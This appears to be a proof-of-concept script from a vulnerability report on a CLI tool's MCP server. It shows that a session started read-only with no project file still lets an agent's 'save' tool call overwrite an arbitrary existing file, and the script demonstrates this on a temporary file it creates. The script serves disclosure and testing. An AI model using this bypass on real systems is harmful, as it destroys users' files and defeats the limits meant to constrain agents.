#!/usr/bin/env python3
"""BIM-1 PoC 1 — bare boundary.

Starts the REAL compiled `bimcraft-cli mcp --read-only` with NO project file
(the headless-agent pattern the docs recommend: "run `bimcraft-cli mcp`
without --connect for a project of the agent's own"). Then asks the
"read-only" agent to `save` the (empty) project directly over an existing
file outside any project directory.

Per crates/core/src/engine.rs `Session::may_read` (line 210):

    let Some(own) = self.path.as_deref() else { return Ok(()) };

When the session has no project path (`self.path == None`, true for every
headless MCP session started without a FILE argument), `may_read` returns
Ok(()) for every command and every path, before it even looks at what was
asked. The --read-only flag never gets a chance to refuse anything.

Usage:
    python3 poc1_bare_boundary.py /path/to/bimcraft-cli
"""
import os
import sys
import tempfile

sys.path.insert(0, os.path.dirname(__file__))
from mcp_client import McpClient  # noqa: E402

if len(sys.argv) != 2:
    print(f"usage: {sys.argv[0]} /path/to/bimcraft-cli", file=sys.stderr)
    sys.exit(2)

BIN = sys.argv[1]

workdir = tempfile.mkdtemp(prefix="bim1-poc1-")
victim = os.path.join(workdir, "quarterly_report.bimcraft")
ORIGINAL = b"THIS IS THE VICTIM'S REAL FILE - NOT A BIMCRAFT PROJECT - DO NOT TOUCH\n"
with open(victim, "wb") as f:
    f.write(ORIGINAL)

print(f"[*] Victim file created: {victim}")
print(f"[*] Original contents:  {ORIGINAL!r}")
print(f"[*] Launching: {BIN} mcp --read-only   (NO project file — the documented headless-agent pattern)")

client = McpClient(BIN, ["--read-only"])
init = client.initialize()
assert "result" in init, f"initialize failed: {init}"
print(f"[*] Server initialized. instructions mention read-only: "
      f"{'read-only' in init['result'].get('instructions', '').lower()}")

print(f"[*] Agent calls execute(\"save\", {{\"path\": \"{victim}\"}}) — this is a WRITE, "
      f"on a server started --read-only, with no connected project file.")
reply = client.call_tool("execute", {"command": "save", "params": {"path": victim}})
client.close()

print("\n==================== RESULT ====================")
print(f"MCP reply: {reply}")

with open(victim, "rb") as f:
    after = f.read()

print(f"\nVictim file now ({len(after)} bytes, was {len(ORIGINAL)}):")
print(after[:200])

is_error = "error" in reply or (isinstance(reply.get("result"), dict) and reply["result"].get("isError"))
if after != ORIGINAL and not is_error:
    print("\n[+] OVERWRITE CONFIRMED: a --read-only MCP session overwrote an arbitrary "
          "pre-existing file with no refusal from the server.")
    sys.exit(0)
else:
    print("\n[-] Not reproduced on this build/version (file unchanged or server refused). "
          "See poc2 for the full documented-pattern chain.")
    sys.exit(1)
